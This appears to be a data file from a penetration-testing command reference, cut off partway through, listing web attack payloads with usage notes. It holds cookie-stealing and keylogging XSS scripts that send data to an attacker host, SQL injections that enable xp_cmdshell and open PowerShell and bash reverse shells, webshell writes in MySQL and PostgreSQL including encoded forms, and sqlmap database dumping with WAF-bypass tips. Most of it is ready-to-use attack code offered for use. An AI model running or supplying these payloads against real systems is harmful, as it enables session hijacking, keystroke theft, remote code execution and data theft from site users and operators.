"xss-test-script-basic","XSS Test - Basic Script Tag","web","<script>alert(1)</script>","Basic XSS test payload using script tag, most direct but heavily filtered method","","","Use when:
Testing basic XSS protection, baseline test before trying advanced bypasses.

Works in:
Unfiltered applications (rare in production).

Delivery:
Any input field, URL parameter.

Expected result:
Immediate alert() on page load.

REALITY CHECK:
Most modern applications filter <script> tags, so this payload often fails.

Use as initial test, then try event-based alternatives if blocked.

AUTHORIZATION:
Only test on authorized targets.","medium","","","","{""Script tags filtered"": ""Modern apps often filter <script>. Try event handlers: xss-test-img-onerror"", ""CSP blocks inline scripts"": ""Look for CSP policy: curl -I <URL> | grep -i content-security-policy"", ""XSS filter triggers"": ""Try obfuscation: <ScRiPt>alert(1)</ScRiPt> or encoding bypasses""}","","","[""xss-test-img-onerror"", ""xss-test-svg-onload"", ""xss-test-script-context-break""]","[""xss-filter-bypass-case"", ""xss-filter-bypass-encoding"", ""xss-cookie-stealer""]"
"xss-test-script-context-break","XSS Test - Script Context Breaking","web","""><script>alert(1)</script>","XSS payload that breaks out of HTML attribute context before injecting script","","","Use when:
Input is reflected inside HTML attribute (common in search forms, user profiles).

Context example:
<input value=""[YOUR INPUT HERE]"">.

The "" closes the attribute, > closes the tag, then <script> executes.

Works in:
All browsers if attribute escaping is missing.

Delivery:
Test by viewing page source first to identify injection context.

Expected result:
Browser alert() after breaking out of attribute.

TECHNIQUE:
This is a 'context-breaking' attack - understanding injection context is critical for XSS exploitation.

AUTHORIZATION:
Test only on authorized systems.","high","","","","{""Quote escaped"": ""Try single quote variant: '><script>alert(1)</script>"", ""Context unclear"": ""View page source to see injection context: <input value=\""USER_INPUT\"">"", ""Payload truncated"": ""Use shorter payload: \""><svg onload=alert(1)>""}","","","[""xss-test-script-basic"", ""xss-test-event-context-break""]","[""xss-cookie-stealer"", ""xss-session-hijack-fetch""]"
"xss-test-event-context-break","XSS Test - Event Handler Context Break","web",""" onerror=alert(1) x=""","XSS payload that stays within tag context but adds malicious event handler attribute","","","Use when:
Input reflected in HTML tag attribute where breaking out would be filtered.

Context example:
<img src=""[YOUR INPUT]"">.

Payload becomes:
<img src="""" onerror=alert(1) x="""">.

The first "" closes src value, onerror= adds handler, x="""" absorbs trailing quote.

Works in:
Contexts where you can inject attributes but not break tags.

Delivery:
View source to identify tag context first.

Expected result:
Alert fires when event triggers (immediately for onerror with invalid src).

ADVANCED:
This technique shows understanding of HTML parsing - staying within tag context while injecting malicious attributes.

AUTHORIZATION:
Test only on authorized systems.","high","","","","{""Event doesn't fire"": ""Combine with IMG tag: \""><img src=x onerror=alert(1)>"", ""Space filtered"": ""Try alternative syntax: \""onerror=alert(1)x=\"""", ""Quote escaped"": ""Check if single quotes work: ' onerror=alert(1) x='""}","","","[""xss-test-script-context-break"", ""xss-test-img-onerror""]","[""xss-cookie-stealer""]"
"xss-filter-bypass-case","XSS Filter Bypass - Case Variation","web","<ScRiPt>alert(1)</ScRiPt>","XSS filter bypass using case variation to evade blacklist filters","","","Use when:
Basic XSS test (xss-test-script-basic) failed due to blacklist filter.

How it works:
HTML is case-insensitive (<ScRiPt> = <script>), but naive filters may only block lowercase.

Works in:
Applications with poorly-implemented blacklist filters.

Delivery:
Same as basic XSS test.

Expected result:
Alert fires if filter only checks lowercase 'script'.

LEARNING POINT:
This demonstrates why blacklist filtering is ineffective - there are infinite variations to bypass.

Modern apps should use whitelist/sanitization instead.

AUTHORIZATION:
Test only on authorized systems.","medium","","","","{""Still filtered"": ""Filter may be case-insensitive. Try: xss-filter-bypass-encoding"", ""Not working"": ""HTML parsers are case-insensitive, but filters may not be. Test systematically.""}","","[""xss-test-script-basic""]","[""xss-filter-bypass-encoding"", ""xss-test-img-onerror""]","[""xss-filter-bypass-encoding"", ""xss-cookie-stealer""]"
"xss-filter-bypass-encoding","XSS Filter Bypass - HTML Entity Encoding","web","<img src=x onerror=""&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"">","XSS filter bypass using HTML entity encoding in event handler to evade signature-based filters","","","Use when:
Basic event handler XSS blocked by keyword filter (e.g., 'alert' blacklisted).

How it works:
HTML entities (&#97; = 'a') encode the JavaScript in onerror attribute.

Browser decodes entities before executing JavaScript.

Encoded:
alert(1) = &#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;.

Works in:
HTML attribute contexts where entities are decoded.

Delivery:
Form inputs, URL parameters.

Expected result:
Browser decodes and executes alert(1).

ADVANCED:
Can also use hex (&#x61;) or named entities (&lt;) depending on context.

AUTHORIZATION:
Test only on authorized systems.

LEARNING:
Demonstrates importance of canonicalization in input validation.","high","","","","{""Not working"": ""HTML entities only decode in attribute values, not in tag names"", ""Still filtered"": ""Try URL encoding: %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"", ""Entities visible in output"": ""Browser should decode automatically - check context""}","","[""xss-test-img-onerror""]","[""xss-filter-bypass-case"", ""xss-filter-bypass-encoding""]","[""xss-cookie-stealer""]"
"xss-cookie-stealer","XSS Cookie Stealer Payload","web","<script>document.location='http://<ATTACKER_IP>:<PORT>/steal.php?c='+document.cookie</script>","XSS exploitation payload that exfiltrates victim's cookies to attacker-controlled server","","<script>document.location='http://10.10.14.5:8000/steal.php?c='+document.cookie</script>","PREREQUISITES:
Start listener on attacker machine:
python3 -m http.server <PORT>.

Use when:
Basic XSS confirmed, targeting session hijacking.

How it works:
document.cookie retrieves all accessible cookies, document.location redirects victim to attacker URL with cookies in query string.

Works in:
Any browser, any XSS context.

Delivery:
Use proven XSS vector (IMG onerror, SVG onload) but replace alert(1) with this payload.

Expected result:
Attacker web server receives HTTP request with victim's cookies.

CRITICAL:
HttpOnly flag (set on sensitive cookies) prevents document.cookie access - check Set-Cookie headers.

AUTHORIZATION:
Only use on authorized penetration tests.

LEGAL:
Unauthorized cookie theft is illegal.

ALTERNATIVES:
Use fetch() API for stealthier exfiltration, or target localStorage for modern apps.","high","","","","{""HttpOnly cookies"": ""HttpOnly prevents JS access. Target other data: localStorage, sessionStorage"", ""CSP blocks"": ""Check CSP: curl -I <URL> | grep -i content-security-policy"", ""No cookies received"": ""Check attacker server running: python3 -m http.server <PORT>"", ""XSS blocked"": ""First achieve basic XSS (xss-test-img-onerror) before exploitation""}","","[""python-http-server"", ""nc-listener""]","[""xss-session-hijack-fetch""]",""
"xss-session-hijack-fetch","XSS Session Hijack via Fetch API","web","<script>fetch('http://<ATTACKER_IP>:<PORT>/steal?c='+document.cookie)</script>","Modern XSS exploitation using Fetch API to exfiltrate session data without page redirect","","<script>fetch('http://10.10.14.5:8000/steal?c='+document.cookie)</script>","PREREQUISITES:
Start listener:
python3 -m http.server <PORT> or nc -lvnp <PORT>.

Use when:
Basic XSS confirmed, prefer stealth over xss-cookie-stealer (which redirects page).

How it works:
fetch() API sends async HTTP request to attacker server without redirecting victim's page.

Modern alternative to XMLHttpRequest.

Works in:
Modern browsers (IE11+, all current browsers).

Delivery:
Inject via proven XSS vector.

Expected result:
Attacker receives HTTP GET request with cookie data in query string, victim page remains unchanged.

ADVANTAGES over document.location:
Stealthy (no redirect), can send multiple requests, victim stays on page.

LIMITATIONS:
HttpOnly cookies still protected.

CSP connect-src directive may block.

AUTHORIZATION:
Only use on authorized tests.

LEGAL:
Session hijacking is illegal without authorization.","high","","","","{""CSP violation"": ""Check Content-Security-Policy header: curl -I <URL>"", ""HttpOnly cookies"": ""Target alternative storage: localStorage, sessionStorage, or DOM content"", ""No data received"": ""Ensure listener running: python3 -m http.server <PORT>"", ""CORS error"": ""CORS doesn't prevent simple GET requests - check CSP instead""}","","[""python-http-server"", ""nc-listener""]","[""xss-cookie-stealer""]",""
"xss-keylogger","XSS Keylogger Payload","web","<script>document.onkeypress=function(e){fetch('http://<ATTACKER_IP>:<PORT>/log?k='+e.key)}</script>","XSS exploitation payload that captures all keystrokes and sends to attacker server in real-time","","<script>document.onkeypress=function(e){fetch('http://10.10.14.5:8000/log?k='+e.key)}</script>","PREREQUISITES:
Start listener:
python3 -m http.server <PORT>.

Use when:
Stored XSS confirmed on high-value target (admin panels, login pages).

How it works:
onkeypress event fires on every key, fetch() sends each keystroke to attacker.

Real-time exfiltration.

Works in:
All modern browsers.

Delivery:
Requires stored/persistent XSS for effectiveness (reflected XSS won't capture much).

Expected result:
Attacker receives stream of HTTP requests with each key pressed.

STEALTH ISSUES:
Generates high network traffic (one request per keystroke), may be noticeable.

IMPROVEMENT:
Buffer keystrokes in array, send batch every 5 seconds to reduce traffic.

AUTHORIZATION:
Only use on authorized penetration tests.

LEGAL:
Keylogging is serious crime without authorization.

ETHICS:
Even in authorized tests, discuss scope with client before deploying keyloggers.","high","","","","{""No keystrokes captured"": ""Check onkeypress fires: Add console.log(e.key) first"", ""CSP blocks fetch"": ""Check CSP policy: curl -I <URL> | grep -i content-security"", ""Too many requests"": ""Buffer keystrokes, send batch every N seconds to reduce traffic"", ""Event overridden"": ""Use addEventListener instead: document.addEventListener('keypress', ...)""}","","[""python-http-server"", ""nc-listener""]","",""
"mssql-xpcmdshell-enable","MSSQL Enable xp_cmdshell","web","'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--","Enable xp_cmdshell extended stored procedure on MSSQL for command execution (requires sysadmin)","","'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--","Must be executed as sysadmin (sa account). xp_cmdshell disabled by default since SQL Server 2005. Two RECONFIGURE statements required - one for each sp_configure.","high","","","","","{""sp_configure 'show advanced options', 1"": ""Enable advanced configuration options visibility"", ""sp_configure 'xp_cmdshell', 1"": ""Enable xp_cmdshell procedure for OS command execution"", ""RECONFIGURE"": ""Apply configuration changes immediately""}","","",""
"mssql-xpcmdshell-whoami","MSSQL xp_cmdshell whoami","web","'; EXEC xp_cmdshell 'whoami';--","Test xp_cmdshell command execution with whoami to identify SQL Server service account","","'; EXEC xp_cmdshell 'whoami';--","Service account context determines privilege level. NT AUTHORITY\SYSTEM = highest privilege. Domain service accounts may have additional AD permissions.","high","","","","","","","",""
"mssql-xpcmdshell-reverse-shell","MSSQL xp_cmdshell Reverse Shell","web","'; EXEC xp_cmdshell 'powershell -nop -c ""$client = New-Object System.Net.Sockets.TCPClient(''<LHOST>'',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""';--","Establish PowerShell reverse shell through MSSQL xp_cmdshell","","'; EXEC xp_cmdshell 'powershell -nop -c ""$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.5'',443);...""';--","Use common ports (80, 443, 53) to bypass egress filtering. Double single quotes ('') for SQL escaping. Start listener first: nc -nlvp 443","high","","","","","","","",""
"mysql-check-file-priv","MySQL Check FILE Privilege","web","' UNION SELECT 1,@@secure_file_priv,3--","Check MySQL secure_file_priv setting to determine if file write is possible","","' UNION SELECT 1,@@secure_file_priv,3--","Empty = write anywhere. Path = write only to that directory. NULL = file operations disabled. Modern MySQL defaults to restricted. Check before attempting INTO OUTFILE.","high","","","","","","","",""
"mysql-into-outfile-webshell","MySQL INTO OUTFILE Webshell","web","' UNION SELECT '<?php system($_GET[""c""]); ?>' INTO OUTFILE '<WEB_ROOT>/shell.php'--","Write PHP webshell to web root using MySQL INTO OUTFILE","","' UNION SELECT '<?php system($_GET[""c""]); ?>' INTO OUTFILE '/var/www/html/shell.php'--","OUTFILE creates NEW file only (fails if exists). Use unique filename. Requires FILE privilege and empty secure_file_priv. Access shell: curl 'http://target/shell.php?c=whoami'","high","","","","","","","",""
"mysql-hex-webshell","MySQL Hex Encoded Webshell","web","' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e INTO OUTFILE '<WEB_ROOT>/shell.php'--","Write PHP webshell using hex encoding to bypass quote filtering","","' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e INTO OUTFILE '/var/www/html/shell.php'--","Hex 0x3c3f70687020...3f3e decodes to <?php system($_GET[""c""]); ?>. Bypasses single/double quote filtering. Generate hex: echo -n 'payload' | xxd -p","high","","","","","","","",""
"postgresql-check-superuser","PostgreSQL Check Superuser","web","'; SELECT current_setting('is_superuser');--","Check if current PostgreSQL user has superuser privileges required for RCE","","'; SELECT current_setting('is_superuser');--","Superuser required for COPY TO, lo_export, and COPY PROGRAM. Check pg_read_server_files/pg_write_server_files roles if not superuser (PostgreSQL 11+).","high","","","","","","","",""
"postgresql-copy-webshell","PostgreSQL COPY TO Webshell","web","'; COPY (SELECT '<?php system($_GET[""c""]); ?>') TO '<WEB_ROOT>/shell.php';--","Write PHP webshell using PostgreSQL COPY TO command","","'; COPY (SELECT '<?php system($_GET[""c""]); ?>') TO '/var/www/html/shell.php';--","Requires superuser. File created with postgres user ownership. Web server must be able to read file. Alternative to COPY: use lo_export with large objects.","high","","","","","","","",""
"postgresql-copy-program","PostgreSQL COPY PROGRAM RCE","web","'; COPY (SELECT '') TO PROGRAM 'bash -c ""bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1""';--","Direct command execution using PostgreSQL COPY TO PROGRAM (9.3+)","","'; COPY (SELECT '') TO PROGRAM 'bash -c ""bash -i >& /dev/tcp/10.10.14.5/4444 0>&1""';--","COPY PROGRAM available PostgreSQL 9.3+. Direct command execution without file write. Requires superuser. Most powerful PostgreSQL RCE method. May be disabled in hardened configs.","high","","","","","","","",""
"postgresql-lo-export","PostgreSQL Large Object Export","web","'; SELECT lo_create(1337); INSERT INTO pg_largeobject (loid, pageno, data) VALUES (1337, 0, decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==', 'base64')); SELECT lo_export(1337, '<WEB_ROOT>/shell.php'); SELECT lo_unlink(1337);--","Write webshell using PostgreSQL large object functions (alternative to COPY)","","'; SELECT lo_create(1337); INSERT INTO pg_largeobject (loid, pageno, data) VALUES (1337, 0, decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==', 'base64')); SELECT lo_export(1337, '/var/www/html/shell.php'); SELECT lo_unlink(1337);--","Alternative when COPY blocked. Base64 payload: <?php system($_GET[""c""]); ?>. lo_create creates object, lo_export writes to file, lo_unlink cleans up.","medium","","","","","","","",""
"sqli-detection-error","SQL Injection Detection (Error-Based)","web","curl -s '<URL>' | grep -iE 'error|warning|mysql|syntax|postgresql|mssql|oracle|sqlite'","Detect SQL injection vulnerabilities by triggering database errors with single quote payload","sql-injection","curl -s 'http://192.168.45.100/page.php?id=1'' | grep -iE 'error|warning|mysql|syntax|postgresql|mssql|oracle|sqlite'","First step in manual SQLi exploitation.

ALWAYS test multiple payloads (single quote, double quote, parenthesis).

Error messages reveal:
(1) Database type (MySQL/PostgreSQL/MSSQL), (2) Query structure, (3) Column names/table names.

Document ALL findings in investigation_checklist.md.

For OSCP:
Master manual techniques BEFORE using sqlmap.

Time estimate:
5-10 minutes for initial detection.","high","","","","{""no_errors"": ""Try alternative payloads: 1' OR '1'='1 (boolean), 1' AND SLEEP(5)-- (time-based), 1') OR ('1'='1 (closing parenthesis). Encode characters: %27 instead of single quote."", ""waf_blocking"": ""Use tamper scripts with sqlmap. Try double encoding: %2527. Add spaces: 1' OR '1' = '1. Use comments: 1'/**/OR/**/1=1--"", ""false_positives"": ""Verify with time-based blind: curl -s 'URL?id=1' AND SLEEP(5)--' -w '%{time_total}'. Response time >5 seconds confirms SQLi."", ""connection_refused"": ""Verify target is reachable: ping <TARGET>. Check port: sudo nmap -p 80,443 -Pn -v <TARGET>"", ""https_certificate_errors"": ""Add -k flag to curl: curl -k -s '<URL>' for self-signed certificates""}","{""-s"": ""Silent mode - suppresses curl progress meter and error messages"", ""-i"": ""Case-insensitive grep - matches ERROR, error, Error"", ""-E"": ""Extended regex - enables alternation (|) and other regex features"", ""error|warning"": ""Common database error keywords indicating SQL syntax issues"", ""mysql|postgresql|mssql"": ""Database-specific keywords revealing backend type""}","","[""sqlmap-post-exploitation""]","[""sqli-column-enum-orderby"", ""sqli-union-select-basic"", ""sqlmap-post-exploitation""]"
"sqli-column-enum-orderby","SQL Injection Column Enumeration (ORDER BY)","web","for i in {1..<MAX_COLS>}; do echo ""Testing column $i""; curl -s '<URL> ORDER BY $i-- -' | grep -i error && echo ""Failed at column $i"" && break; done","Enumerate number of columns in SQL query using ORDER BY technique (required before UNION SELECT)","sql-injection","for i in {1..20}; do echo ""Testing column $i""; curl -s 'http://192.168.45.100/page.php?id=1 ORDER BY $i-- -' | grep -i error && echo ""Failed at column $i"" && break; done","CRITICAL step for UNION-based SQLi.

Column count MUST match between original query and UNION SELECT.

Manual alternative:
Test ORDER BY 1, ORDER BY 2, ORDER BY 3...

until error.

When error occurs at column N, original query has N-1 columns.

Example:
Error at ORDER BY 5 = query has 4 columns.

Time estimate:
2-5 minutes.

Document column count in investigation_checklist.md for UNION exploitation phase.","high","","","","{""all_columns_error"": ""Try alternative syntax: ORDER BY $i# (MySQL), ORDER BY $i;-- (MSSQL), ORDER BY $i--+ (URL-encoded space)"", ""no_errors_detected"": ""Test manually: curl -s 'URL ORDER BY 100-- -' should error. If not, use time-based: ORDER BY $i AND SLEEP(1)-- -"", ""waf_blocking"": ""Add delays: sleep 1 between iterations. Use different comment styles: /*, #, ;--"", ""parenthesis_needed"": ""Try: ORDER BY $i)-- - or ORDER BY $i))-- - if query has nested parentheses"", ""union_alternative"": ""If ORDER BY fails, try UNION SELECT NULL,NULL,...NULL incrementally until no error""}","{""ORDER BY"": ""Orders result set by column number - errors when column number exceeds total columns"", ""$i"": ""Loop variable incrementing from 1 to MAX_COLS"", ""-- -"": ""SQL comment syntax (double dash space dash) - comments out rest of query. Alternative: #, /* */"", ""grep -i error"": ""Detects when ORDER BY number is too high (column doesn't exist)"", ""break"": ""Exits loop when first error occurs (found max column count)""}","[""sqli-detection-error""]","[""sqlmap-post-exploitation""]","[""sqli-union-select-basic"", ""sqli-union-mysql-info"", ""sqli-union-postgresql-info"", ""sqli-union-mssql-info""]"
"sqli-union-select-basic","SQL Injection UNION SELECT (Basic Extraction)","web","curl -s '<URL> UNION SELECT <NULL_COLUMNS>-- -'","Test UNION SELECT injection and identify which columns are displayed on page (required for data extraction)","sql-injection","curl -s 'http://192.168.45.100/page.php?id=-1 UNION SELECT 'test1',NULL,NULL,'test2'-- -'","FOUNDATION of UNION-based SQLi exploitation.

Once you identify displayed columns (e.g., columns 2 and 4 visible), ALL future queries use those positions for data extraction.

Example workflow:
(1) Enumerate columns:
4 total, (2) Test visibility:
'test1',NULL,NULL,'test2', (3) Identify:
columns 1 and 4 are displayed, (4) Extract data:
database(),user(),NULL,version().

Time estimate:
5-10 minutes.

ALWAYS test with invalid id first (id=-1) to avoid mixing original and injected results.

Document displayed column positions in investigation_checklist.md.","high","","","","{""column_mismatch"": ""Recount columns with ORDER BY. Ensure NULL count matches exactly. Example: 4 columns = NULL,NULL,NULL,NULL"", ""strings_not_visible"": ""Try different positions: 'test1',NULL,NULL,NULL then NULL,'test2',NULL,NULL. Check page source (Ctrl+U) - strings may be in hidden fields/comments"", ""type_conversion_error"": ""Replace all NULLs with strings: 'a','b','c','d' or all integers: 1,2,3,4 depending on database"", ""waf_blocking_union"": ""Obfuscate: UNION/**/SELECT, UNI/**/ON/**/SEL/**/ECT, union+select (URL encoding)"", ""no_results_displayed"": ""Original query may have WHERE clause: try id=1 UNION instead of id=-1. Check if results are JSON/XML (not HTML)""}","{""UNION SELECT"": ""Combines results from injected query with original query results"", ""NULL"": ""Placeholder value compatible with any data type (prevents type mismatch errors)"", ""id=-1"": ""Invalid ID ensures original query returns zero rows, making injected data visible"", ""'test1','test2'"": ""String markers to identify which column positions appear on page"", ""-- -"": ""SQL comment - ignores rest of original query (prevents syntax errors)""}","[""sqli-detection-error"", ""sqli-column-enum-orderby""]","[""sqlmap-post-exploitation""]","[""sqli-union-mysql-info"", ""sqli-union-postgresql-info"", ""sqli-union-mssql-info""]"
"sqli-union-mysql-info","SQL Injection UNION SELECT (MySQL Information Extraction)","web","curl -s '<URL> UNION SELECT <PAYLOAD>,<EMPTY_COLS>-- -' | grep -i '<SEARCH_TERM>'","Extract MySQL database information using UNION SELECT injection (database names, table names, column names, data)","sql-injection","curl -s 'http://192.168.45.100/page.php?id=-1 UNION SELECT CONCAT(table_schema,':',table_name),NULL,NULL,NULL-- -' | grep -i 'users'","MySQL-SPECIFIC extraction queries (order matters):
(1) List databases:
database() or CONCAT(schema_name) FROM information_schema.schemata.

(2) List tables:
CONCAT(table_schema,':',table_name) FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema').

(3) List columns:
CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='target_db'.

(4) Extract data:
CONCAT(username,':',password) FROM users.

Use GROUP_CONCAT() to get all rows:
GROUP_CONCAT(username,':',password SEPARATOR '|') FROM users.

Time estimate:
10-20 minutes for full database enumeration.

OSCP TIP:
Always check for 'users', 'admin', 'credentials', 'accounts' tables.

Document findings in investigation_checklist.md.","high","","","","{""no_data_visible"": ""Verify column position: Use 'test' instead of PAYLOAD to confirm visibility. Move PAYLOAD to different column position."", ""concat_not_working"": ""Try CONCAT_WS(':',col1,col2) or col1||':'||col2 (standard SQL concatenation)"", ""too_many_results"": ""Add LIMIT clause: FROM information_schema.tables LIMIT 0,10. Or use WHERE: WHERE table_schema='webapp_db'"", ""access_denied"": ""Try direct table access if you know table names: UNION SELECT username,password,NULL,NULL FROM users"", ""encoding_issues"": ""Use HEX() function: HEX(username) then decode manually, or LOAD_FILE() for file reading""}","{""information_schema"": ""MySQL system database containing metadata about all databases, tables, columns"", ""CONCAT()"": ""MySQL function to combine multiple values into single string (column limitation workaround)"", ""table_schema"": ""Database name in information_schema.tables"", ""table_name"": ""Table name in information_schema.tables"", ""column_name"": ""Column name in information_schema.columns"", ""GROUP_CONCAT()"": ""Combines multiple rows into single comma-separated string (extracts all tables at once)"", ""0x3a"": ""Hexadecimal for colon (:) - delimiter for concatenated values""}","[""sqli-detection-error"", ""sqli-column-enum-orderby"", ""sqli-union-select-basic""]","[""sqlmap-post-exploitation""]","[""sqlmap-post-exploitation""]"
"sqli-union-postgresql-info","SQL Injection UNION SELECT (PostgreSQL Information Extraction)","web","curl -s '<URL> UNION SELECT <PAYLOAD>,<EMPTY_COLS>-- -' | grep -i '<SEARCH_TERM>'","Extract PostgreSQL database information using UNION SELECT injection (databases, tables, columns, data, file read)","sql-injection","curl -s 'http://192.168.45.100/page.php?id=-1 UNION SELECT table_name||':'||column_name,NULL,NULL,NULL-- -' | grep -i 'users'","PostgreSQL-SPECIFIC extraction queries (syntax differs from MySQL):
(1) Version/User:
version() or current_user().

(2) Current database:
current_database().

(3) List tables:
table_name FROM information_schema.tables WHERE table_schema='public'.

(4) List columns:
table_name||':'||column_name FROM information_schema.columns WHERE table_schema='public'.

(5) Extract data:
username||':'||password FROM users.

(6) File read:
pg_read_file('/etc/passwd',0,1000) requires superuser.

(7) Command execution:
COPY (SELECT '') TO PROGRAM 'id' (PostgreSQL 9.3+ with superuser).

OSCP TIP:
PostgreSQL often has 'postgres' superuser with weak password.

Test default credentials.

Time estimate:
10-20 minutes.

Document in investigation_checklist.md.","high","","","","{""concat_syntax_error"": ""PostgreSQL uses || not CONCAT(): 'string1'||'string2'. Replace CONCAT(a,b) with a||b"", ""type_mismatch"": ""Cast to text: CAST(column AS text) or column::text. Example: NULL::text,payload::text,NULL::text"", ""no_data_visible"": ""Verify column position with 'test'::text. Move payload to displayed column from sqli-union-select-basic"", ""access_denied_pg_catalog"": ""Use information_schema instead: FROM information_schema.tables. Or try direct table access if you know names."", ""file_read_failed"": ""Use pg_read_file() requires superuser. Alternative: COPY (SELECT '') TO PROGRAM 'cat /etc/passwd' (PostgreSQL 9.3+)""}","{""pg_catalog"": ""PostgreSQL system schema containing metadata (equivalent to MySQL information_schema)"", ""information_schema"": ""Standard SQL schema also available in PostgreSQL (alternative to pg_catalog)"", ""||"": ""PostgreSQL concatenation operator (joins strings)"", ""table_name||':'||column_name"": ""Concatenates table and column name with colon separator"", ""CAST()"": ""Type conversion function (sometimes needed for NULL compatibility)"", ""version()"": ""Returns PostgreSQL version string""}","[""sqli-detection-error"", ""sqli-column-enum-orderby"", ""sqli-union-select-basic""]","[""sqlmap-post-exploitation""]","[""sqlmap-post-exploitation""]"
"sqli-union-mssql-info","SQL Injection UNION SELECT (MSSQL Information Extraction)","web","curl -s '<URL> UNION SELECT <PAYLOAD>,<EMPTY_COLS>-- -' | grep -i '<SEARCH_TERM>'","Extract Microsoft SQL Server information using UNION SELECT injection (databases, tables, columns, xp_cmdshell RCE)","sql-injection","curl -s 'http://192.168.45.100/page.aspx?id=-1 UNION SELECT name+':'+type_desc,NULL,NULL,NULL-- -' | grep -i 'users'","MSSQL-SPECIFIC extraction queries and RCE techniques:
(1) Version:
@@version or SERVERPROPERTY('ProductVersion').

(2) Current database:
DB_NAME().

(3) List databases:
name FROM sys.databases (exclude system:
WHERE name NOT IN ('master','tempdb','model','msdb')).

(4) List tables:
name+':'+type_desc FROM sys.tables.

(5) List columns:
c.name+':'+t.name FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id.

(6) Extract data:
username+':'+CAST(password AS VARCHAR) FROM users.

(7) RCE via xp_cmdshell:
EXEC xp_cmdshell 'whoami' (requires sysadmin role).

(8) Enable xp_cmdshell:
UNION SELECT NULL; EXEC sp_configure 'show advanced',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- (stacked queries needed).

OSCP TIP:
MSSQL often runs as 'NT AUTHORITY\SYSTEM' - xp_cmdshell = instant SYSTEM shell.

Test for stacked queries first.

Time estimate:
15-25 minutes.

Document xp_cmdshell status in investigation_checklist.md.","high","","","","{""concat_syntax_error"": ""MSSQL uses + not ||: 'string1'+'string2'. Replace || with +"", ""type_conversion_error"": ""Cast integers: CAST(column AS VARCHAR). Example: name+':'+CAST(object_id AS VARCHAR)"", ""no_data_visible"": ""Test column position with 'test' string. Verify displayed columns from sqli-union-select-basic"", ""xp_cmdshell_disabled"": ""Enable with: EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; (requires sysadmin). Alternative: use OPENROWSET for file read"", ""access_denied_sys_tables"": ""Try information_schema: FROM information_schema.tables. Or direct table access: FROM dbo.users"", ""waf_blocking_xp_cmdshell"": ""Obfuscate: xp/**/_cmd/**/shell or DECLARE @x VARCHAR(100); SET @x='xp_cmdshell'; EXEC @x 'whoami'""}","{""sys.databases"": ""MSSQL system view containing all database names"", ""sys.tables"": ""System view containing all tables in current database"", ""sys.columns"": ""System view containing all columns"", ""+"": ""MSSQL concatenation operator (joins strings)"", ""CAST()"": ""Type conversion (INT to VARCHAR for concatenation)"", ""@@version"": ""MSSQL global variable - returns version string"", ""xp_cmdshell"": ""MSSQL extended stored procedure for OS command execution (requires sysadmin)""}","[""sqli-detection-error"", ""sqli-column-enum-orderby"", ""sqli-union-select-basic""]","[""sqlmap-post-exploitation""]","[""sqlmap-post-exploitation""]"
"sqlmap-post-exploitation","SQLMap Automated Exploitation","web","sqlmap -u '<URL>' --batch --dump <OPTIONS>","Automated SQL injection exploitation using sqlmap (after manual verification - OSCP requires manual attempt first)","sql-injection","sqlmap -u 'http://192.168.45.100/page.php?id=1*' --batch --dump -D webapp_db -T users --threads 5","OSCP WORKFLOW REQUIREMENT:
(1) ALWAYS attempt manual SQLi first (sqli-detection-error  sqli-column-enum-orderby  sqli-union-select-basic).

(2) Document manual findings in investigation_checklist.md.

(3) THEN use sqlmap for faster enumeration.

Common sqlmap workflow:
Step 1:
Detect injection:
sqlmap -u 'URL' --batch.

Step 2:
Enumerate databases:
sqlmap -u 'URL' --batch --dbs.

Step 3:
Enumerate tables:
sqlmap -u 'URL' --batch -D webapp_db --tables.

Step 4:
Dump specific table:
sqlmap -u 'URL' --batch -D webapp_db -T users --dump.

Step 5:
Attempt OS shell:
sqlmap -u 'URL' --batch --os-shell (MSSQL xp_cmdshell, PostgreSQL COPY).

Output location:
~/.local/share/sqlmap/output/<TARGET>/ (check log.txt for full output).

Time estimate:
5-30 minutes depending on injection type and database size.

WAF bypass:
Use --tamper=space2comment for comments, --tamper=between for AND/OR replacement.

POST requests:
sqlmap -u 'URL' --data='id=1&submit=Submit' (specify POST data).

Cookies:
--cookie='PHPSESSID=abc123'.

Custom headers:
--headers='X-Forwarded-For:
127.0.0.1'.

REMEMBER:
Manual technique demonstrates understanding for OSCP report.","high","","","","{""not_injectable"": ""Verify manually first with sqli-detection-error. Try marking injection point explicitly: url?id=1* (asterisk). Use -p parameter to test specific param: -p id"", ""waf_detected"": ""Use tamper scripts: --tamper=space2comment,between. Add random agent: --random-agent. Increase delay: --delay=2. Lower threads: --threads=1"", ""connection_timeout"": ""Check network: ping <TARGET>. Increase timeout: --timeout=30. Use proxy: --proxy=http://127.0.0.1:8080 (with Burp)"", ""false_positives"": ""Increase test level: --level=3. Specify technique: --technique=BEUST. Manual verify: compare outputs for id=1 vs id=2"", ""slow_enumeration"": ""Increase threads: --threads=5. Skip constant columns: --no-cast. Use WHERE: --where='username like \""%admin%\""'"", ""no_os_shell"": ""Try --os-pwn for meterpreter. Check database user: --current-user. Escalate: --sql-shell then 'SELECT IS_SRVROLEMEMBER('sysadmin')' for MSSQL""}","{""-u"": ""Target URL (use * to mark 